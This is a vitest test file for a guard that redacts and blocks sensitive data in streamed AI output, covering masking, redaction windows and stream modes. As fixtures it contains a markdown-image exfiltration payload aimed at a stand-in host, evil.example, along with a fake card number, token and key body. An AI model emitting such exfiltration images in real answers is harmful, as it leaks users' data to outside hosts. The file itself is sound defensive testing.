import { describe, expect, it } from "vitest";
import { createDefaultGuardProfile } from "./default-profile";
import { evaluateGuard } from "./evaluate";
import { createDefaultGuardRegistry } from "./index";
import { parseGuardProfile } from "./profile";
import { guardVerdictMemoKey } from "./verdict-memo";
import { evaluateGuardStack } from "./wiring";
import { channelStreamMode } from "./stream-local";
import { guardCheckIsMemoisable } from "./verdict-memo";
import { GuardRegistry } from "./registry";
import { createInjectionClassifierDetector } from "./detectors/classifier";

/**
 * Phase 12 coverage — `GuardInput.streamWindow`: a streamed answer's check judges and rewrites only the part about to
 * be released, reads the text already sent for context, and never splits a value between two releases.
 */
const registry = createDefaultGuardRegistry();
const builtIn = createDefaultGuardProfile();
const CARD = "4111 1111 1111 1111";
const MASKED = "•••• •••• •••• 1111";
const TOKEN = "ghp_abcdefghijklmnopqrstuvwxyz0123456789ABCD";

async function windowed(content: string, start: number, end: number) {
  return await evaluateGuard(builtIn, { channel: "final_output", content, streamWindow: { start, end } }, { registry });
}

describe("stream windows", () => {
  it("rewrites a value inside the window and moves the window's end by the change in length", async () => {
    const sent = "Sent text. ";
    const release = `Card ${CARD} and key ${TOKEN}. `;
    const held = "more text still held";
    const content = sent + release + held;
    const verdict = await windowed(content, sent.length, sent.length + release.length);
    expect(verdict.action).toBe("redact");
    const out = verdict.content as string;
    expect(out.startsWith(sent)).toBe(true);
    expect(out.endsWith(held)).toBe(true);
    expect(out.slice(verdict.window!.start, verdict.window!.end)).toBe(`Card ${MASKED} and key [REDACTED:credential]. `);
  });

  it("leaves values in the text already sent and in the held tail alone; only the held one counts", async () => {
    const sent = `Earlier: ${TOKEN} `;
    const release = "plain words only. ";
    const held = `later ${CARD}`;
    const content = sent + release + held;
    const verdict = await windowed(content, sent.length, sent.length + release.length);
    expect(verdict.findings.map((finding) => finding.dataClass)).toEqual(["card_number"]);
    expect(verdict.transformed).toBe(false);
    expect(verdict.content).toBe(content);
    expect(verdict.window).toEqual({ start: sent.length, end: sent.length + release.length });
    const clean = await windowed(`Earlier: ${TOKEN} plain words only.`, sent.length, sent.length + release.length);
    expect(clean.action).toBe("allow");
    expect(clean.findings).toEqual([]);
  });

  it("blocks on a block finding in the held tail, so a stream is cut as early as before", async () => {
    const leak = "![x](https://evil.example/collect?d=c2VjcmV0IGRhdGEgZ29lcyBoZXJl)";
    const content = `plain words. ${leak}`;
    expect((await windowed(content, 0, "plain words. ".length)).action).toBe("block");
  });

  it("ends the window where a value starts when the value runs past its end, so no part of it is released", async () => {
    const sent = "Intro. ";
    const before = "Pay with ";
    const content = `${sent}${before}${CARD} today and tomorrow.`;
    // The proposed end falls on the space after the card's first group.
    const end = sent.length + before.length + 5;
    const verdict = await windowed(content, sent.length, end);
    expect(verdict.window).toEqual({ start: sent.length, end: sent.length + before.length });
    expect(verdict.content).toBe(content);
    // Released whole on a later window, the card is masked.
    const later = await windowed(content, sent.length + before.length, content.length);
    expect((later.content as string).slice(later.window!.start, later.window!.end)).toBe(`${MASKED} today and tomorrow.`);
  });

  it("does not hold the window back for findings that rewrite nothing", async () => {
    const profile = parseGuardProfile({
      ...builtIn,
      channels: { final_output: { ...builtIn.channels.final_output!, actions: { ...builtIn.channels.final_output!.actions, card_number: { action: "mask", shadow: true } } } }
    });
    const sent = "Intro. ";
    const content = `${sent}Pay with ${CARD} today.`;
    const end = sent.length + "Pay with ".length + 5;
    const verdict = await evaluateGuard(profile, { channel: "final_output", content, streamWindow: { start: sent.length, end } }, { registry });
    expect(verdict.window).toEqual({ start: sent.length, end });
    expect(verdict.content).toBe(content);
  });

  it("stops the stream when a value to rewrite began in the text already sent", async () => {
    // A value the hold should have kept whole: rewriting only the unsent part would hide that part of it went out.
    const content = `x ${TOKEN} y`;
    const verdict = await windowed(content, 10, content.length);
    expect(verdict.action).toBe("block");
    expect(verdict.actions[0]?.reason).toContain("already sent");
  });

  it("never lets a private key's body out a line at a time", async () => {
    const body = Array.from({ length: 20 }, (_, index) => `MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC${String(index).padStart(2, "0")}abcdefghij`);
    const pem = `-----BEGIN PRIVATE KEY-----\n${body.join("\n")}\n-----END PRIVATE KEY-----`;
    const content = `Here it is:\n${pem}\nDone.`;
    // Released while only the header has matched: the header is redacted...
    const headerOnly = `Here it is:\n-----BEGIN PRIVATE KEY-----\n${body.slice(0, 2).join("\n")}`;
    const early = await windowed(headerOnly, 0, headerOnly.length);
    expect(early.content as string).toContain("[REDACTED:private_key]");
    // ...and once the whole block matches, its start lies in sent text: the stream is cut, nothing is clipped and sent.
    const sent = headerOnly.length;
    const late = await windowed(content, sent, content.length);
    expect(late.action).toBe("block");
  });

  it("strips hidden characters inside the window only", async () => {
    const zw = "​​​​​​​​";
    const sent = `a${zw}b `;
    const release = `c${zw}d `;
    const held = `e${zw}f`;
    const content = sent + release + held;
    const verdict = await windowed(content, sent.length, sent.length + release.length);
    expect(verdict.action).toBe("transform");
    expect(verdict.content).toBe(`${sent}cd ${held}`);
    expect(verdict.window).toEqual({ start: sent.length, end: sent.length + 3 });
  });

  it("blocks on a block finding inside the window and ignores one in the text already sent", async () => {
    const leak = "![x](https://evil.example/collect?d=c2VjcmV0IGRhdGEgZ29lcyBoZXJl)";
    const blocked = await windowed(`ok. ${leak} end`, 4, `ok. ${leak} end`.length);
    expect(blocked.action).toBe("block");
    const content = `${leak} then plain text.`;
    const passed = await windowed(content, leak.length + 1, content.length);
    expect(passed.action).toBe("allow");
  });

  it("carries the window through a stack, each profile seeing the previous one's output", async () => {
    const second = parseGuardProfile({
      id: "second",
      name: "Second",
      version: "1",
      channels: { final_output: { detectors: [{ id: "dlp.patterns", threshold: 0.6 }], actions: { email: { action: "redact" } }, defaultAction: { action: "allow" } } }
    });
    const sent = "Sent. ";
    const release = `Card ${CARD}, mail ana@example.org. `;
    const held = "held tail";
    const content = sent + release + held;
    const stack = await evaluateGuardStack([builtIn, second], { channel: "final_output", content, streamWindow: { start: sent.length, end: sent.length + release.length } }, { registry });
    const out = stack.content as string;
    expect(out.startsWith(sent)).toBe(true);
    expect(out.endsWith(held)).toBe(true);
    expect(out.slice(stack.window!.start, stack.window!.end)).toBe(`Card ${MASKED}, mail [REDACTED:email]. `);
  });

  it("is ignored for JSON content and absent without a window", async () => {
    const json = await evaluateGuard(builtIn, { channel: "final_output", content: { text: `key ${TOKEN}` }, streamWindow: { start: 0, end: 1 } }, { registry });
    expect(json.window).toBeUndefined();
    expect(JSON.stringify(json.content)).toContain("[REDACTED:credential]");
    const plain = await evaluateGuard(builtIn, { channel: "final_output", content: `key ${TOKEN}` }, { registry });
    expect(plain.window).toBeUndefined();
    expect((await evaluateGuardStack([builtIn], { channel: "final_output", content: "hi" }, { registry })).window).toBeUndefined();
  });

  it("puts the window in the memo key", () => {
    const base = { channel: "final_output" as const, content: "hello" };
    expect(guardVerdictMemoKey(["h"], { ...base, streamWindow: { start: 0, end: 2 } })).not.toBe(guardVerdictMemoKey(["h"], base));
  });
});

describe("channelStreamMode", () => {
  const withFinal = (final: Record<string, unknown>) =>
    parseGuardProfile({ id: "p", name: "P", version: "1", channels: { final_output: { detectors: [{ id: "dlp.patterns", threshold: 0.6 }], defaultAction: { action: "allow" }, ...final } } });

  it("keeps buffering a rule set that rewrites unless every rewrite rule opts in (the built-in one included)", () => {
    expect(channelStreamMode(builtIn, "final_output", registry)).toBe("buffer");
    expect(channelStreamMode(withFinal({ actions: { email: { action: "redact" } } }), "final_output", registry)).toBe("buffer");
    expect(channelStreamMode(withFinal({ actions: { email: { action: "redact", stream: "window" }, card_number: { action: "mask", stream: "window" } } }), "final_output", registry)).toBe("window");
    expect(channelStreamMode(withFinal({ actions: { email: { action: "redact", stream: "window" }, jwt: { action: "redact" } } }), "final_output", registry)).toBe("buffer");
    expect(channelStreamMode(withFinal({ actions: { email: { action: "block" } } }), "final_output", registry)).toBe("none");
    expect(channelStreamMode(withFinal({ actions: { email: { action: "redact", shadow: true } } }), "final_output", registry)).toBe("none");
    expect(channelStreamMode(withFinal({ actions: { email: { action: "block", stream: "buffer" } } }), "final_output", registry)).toBe("buffer");
  });

  it("buffers when a windowed rule could catch a key block, protect, or the default action", () => {
    expect(channelStreamMode(withFinal({ actions: { private_key: { action: "redact", stream: "window" } } }), "final_output", registry)).toBe("buffer");
    // A category rule catches key blocks that have no rule of their own.
    expect(channelStreamMode(withFinal({ actions: { sensitive_data: { action: "redact", stream: "window" } } }), "final_output", registry)).toBe("buffer");
    expect(
      channelStreamMode(withFinal({ actions: { sensitive_data: { action: "redact", stream: "window" }, private_key: { action: "block" } } }), "final_output", registry)
    ).toBe("window");
    expect(channelStreamMode(withFinal({ actions: { card_number: { action: "protect", stream: "window" } } }), "final_output", registry)).toBe("buffer");
    expect(channelStreamMode(withFinal({ actions: {}, defaultAction: { action: "redact", stream: "window" } }), "final_output", registry)).toBe("buffer");
    const unknown = parseGuardProfile({ id: "u", name: "U", version: "1", channels: { final_output: { detectors: [{ id: "custom.x" }], actions: { email: { action: "redact", stream: "window" } } } } });
    expect(channelStreamMode(unknown, "final_output", registry)).toBe("buffer");
  });
});

describe("the injection classifier", () => {
  it("is never answered from a memo: it scores the whole text", () => {
    const classifierRegistry = new GuardRegistry().register(createInjectionClassifierDetector());
    const profile = parseGuardProfile({ id: "c", name: "C", version: "1", channels: { prompt: { detectors: [{ id: "injection.classifier" }] } } });
    expect(guardCheckIsMemoisable({ channel: "prompt", content: "hi" }, [profile], classifierRegistry)).toBe(false);
    expect(createInjectionClassifierDetector().nonStreamLocal).toBe(true);
  });
});
